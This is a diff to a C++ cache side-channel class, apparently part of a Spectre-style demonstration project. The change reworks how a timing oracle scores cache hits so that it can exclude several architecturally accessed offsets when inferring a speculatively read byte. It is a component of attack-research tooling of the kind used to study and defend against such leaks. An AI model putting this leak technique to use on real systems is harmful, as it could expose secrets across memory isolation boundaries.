@@ -51,7 +51,20 @@ void CacheSideChannel::FlushOracle() const {
   }
 }
 
-std::pair<bool, char> CacheSideChannel::RecomputeScores(char safe_offset_char) {
+std::pair<bool, char> CacheSideChannel::RecomputeScores(
+    std::set<char> architectural_hits) {
+  static size_t additional_offset_counter = 0;
+
+  // If there are no architectural hits, we add a new one artificially.
+  if (architectural_hits.empty()) {
+    size_t mixed_i = ((additional_offset_counter * 167) + 13) & 0xFF;
+    architectural_hits.insert(static_cast<char>(mixed_i));
+    ForceRead(&GetOracle()[mixed_i]);
+    additional_offset_counter = (additional_offset_counter + 1) % 256;
+  }
+
+  char safe_offset_char = *architectural_hits.begin();
+
   std::array<uint64_t, 256> latencies = {};
   size_t best_val = 0, runner_up_val = 0;
 
@@ -59,11 +72,11 @@ std::pair<bool, char> CacheSideChannel::RecomputeScores(char safe_offset_char) {
   // latency. Indexing into isolated_oracle causes the relevant region of
   // memory to be loaded into cache, which makes it faster to load again than
   // it is to load entries that had not been accessed.
-  // Only two offsets will have been accessed: safe_offset (which we ignore),
-  // and i.
-  // Note: if the character at safe_offset is the same as the character we
-  // want to know at i, the data from this run will be useless, but later runs
-  // will use a different safe_offset.
+  // Along with members of architectural_hits there has been a speculatively
+  // accessed offset that we want to detect.
+  // Note: if the speculatively accessed offset is in architectural_hits, the
+  // data from this run will be useless, but later runs will use a different
+  // architecturally accessed offsets.
   for (size_t i = 0; i < 256; ++i) {
     // Some CPUs (e.g. AMD Ryzen 5 PRO 2400G) prefetch cache lines, rendering
     // them all equally fast. Therefore it is necessary to confuse them by
@@ -82,6 +95,7 @@ std::pair<bool, char> CacheSideChannel::RecomputeScores(char safe_offset_char) {
   sorted_latencies_list.sort();
   std::vector<uint64_t> sorted_latencies(sorted_latencies_list.begin(),
                                          sorted_latencies_list.end());
+
   uint64_t median_latency = sorted_latencies[128];
 
   // The difference between a cache-hit and cache-miss times is significantly
@@ -91,7 +105,8 @@ std::pair<bool, char> CacheSideChannel::RecomputeScores(char safe_offset_char) {
   int hitcount = 0;
   for (size_t i = 0; i < 256; ++i) {
     if (latencies[i] < median_latency - hitmiss_diff / 2 &&
-        i != static_cast<size_t>(safe_offset_char)) {
+        architectural_hits.find(
+            static_cast<char>(i)) == architectural_hits.end()) {
       ++hitcount;
     }
   }
@@ -101,7 +116,8 @@ std::pair<bool, char> CacheSideChannel::RecomputeScores(char safe_offset_char) {
   if (hitcount == 1) {
     for (size_t i = 0; i < 256; ++i) {
       if (latencies[i] < median_latency - hitmiss_diff / 2 &&
-          i != static_cast<size_t>(safe_offset_char)) {
+          architectural_hits.find(
+              static_cast<char>(i)) == architectural_hits.end()) {
         ++scores_[i];
       }
     }
